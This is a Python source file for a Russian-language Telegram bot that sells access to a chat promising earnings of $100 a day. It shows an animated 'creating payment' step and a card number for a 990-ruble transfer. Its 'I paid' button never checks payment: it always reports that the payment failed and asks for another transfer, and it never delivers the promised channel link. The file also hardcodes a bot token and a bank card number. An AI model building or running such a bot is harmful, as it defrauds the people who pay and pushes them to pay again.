# -*- coding: utf-8 -*-
import os,time,threading
import telebot
from telebot import types
from flask import Flask, request

TOKEN = "8887413578:AAFXozOLiKdfO6UyoLjRltB4w_EL-OXiqLE"
bot=telebot.TeleBot(TOKEN)
app=Flask(__name__)
last={}

def cleanup(cid):
    for mid in last.get(cid,[]):
        try: bot.delete_message(cid,mid)
        except: pass
    last[cid]=[]

def send(cid,text,markup=None):
    m=bot.send_message(cid,text,reply_markup=markup)
    last.setdefault(cid,[]).append(m.message_id)
    return m

def homekb():
    kb=types.InlineKeyboardMarkup()
    kb.row(types.InlineKeyboardButton("Оплатить 💰",callback_data="pay"))
    kb.row(types.InlineKeyboardButton("О чем канал ❔",callback_data="about"))
    return kb

@bot.message_handler(commands=["start"])
def start(m):
    cleanup(m.chat.id)
    send(m.chat.id,"Привет 👋\n\nЕсли ты хочешь зарабатывать от $100 в день то можешь купить доступ к моему чату учеников.",homekb())

@bot.callback_query_handler(func=lambda c:True)
def cb(c):
    cid=c.message.chat.id
    cleanup(cid)
    if c.data=="about":
        kb=types.InlineKeyboardMarkup()
        kb.row(types.InlineKeyboardButton("Назад ◀️",callback_data="home"))
        send(cid,"Канал где я помогу тебе начать зарабатывать меньше чем через неделю. ⏳\nТам ты сможешь узнать все подробности о том как завести свой канал и как на этом заработать. 💸\nЕсли у тебя не получится, то я всегда рад помочь тебе. 🫡\nА так же у нас есть чат где ты можешь кому то дать свой совет или же тебе дадут его. 🎬\n\nБуду рад видеть тебя!",kb)
    elif c.data=="home":
        send(cid,"Привет 👋\n\nЕсли ты хочешь зарабатывать от $100 в день то можешь купить доступ к моему чату учеников.",homekb())
    elif c.data=="pay":
        m=send(cid,"⏳ Создаем оплату.")
        for i in range(17):
            try: bot.edit_message_text("⏳ Создаем оплату"+"."*((i%3)+1),cid,m.message_id)
            except: pass
            time.sleep(0.3)
        cleanup(cid)
        time.sleep(3)
        kb=types.InlineKeyboardMarkup()
        kb.row(types.InlineKeyboardButton("Скопировать карту 💳",callback_data="card"))
        kb.row(types.InlineKeyboardButton("Отменить ✖️",callback_data="home"))
        kb.row(types.InlineKeyboardButton("Я оплатил ✅",callback_data="paid"))
        send(cid,"Готов счет на оплату 💳\nПосле оплаты вам придет ссылка в наш канал ⭐\n\n💰 К оплате: 990₽\nРеквизиты: 2200702056542769\n\nУкажите в описании перевода свой @username.",kb)
    elif c.data=="card":
        bot.answer_callback_query(c.id,"Telegram не позволяет автоматически копировать текст.")
        send(cid,"2200702056542769")
    elif c.data=="paid":
        m=send(cid,"⏳ Проверка платежа...")
        time.sleep(5)
        cleanup(cid)
        kb=types.InlineKeyboardMarkup()
        kb.row(types.InlineKeyboardButton("Назад ◀️",callback_data="home"))
        kb.row(types.InlineKeyboardButton("Заново 🔄",callback_data="pay"))
        send(cid,"Извините, платеж не прошел или пришла не вся сумма за выбранную услугу. Повторите еще раз.",kb)

@app.route(f"/{TOKEN}",methods=["POST"])
def wh():
    u=telebot.types.Update.de_json(request.get_data().decode())
    bot.process_new_updates([u]); return "OK",200
@app.route("/")
def h(): return "Bot is running",200
if __name__=="__main__":
    bot.remove_webhook()
    bot.set_webhook(url=f"https://kenda-bot-elsz.onrender.com/{TOKEN}")
    app.run(host="0.0.0.0",port=int(os.environ.get("PORT",10000)))
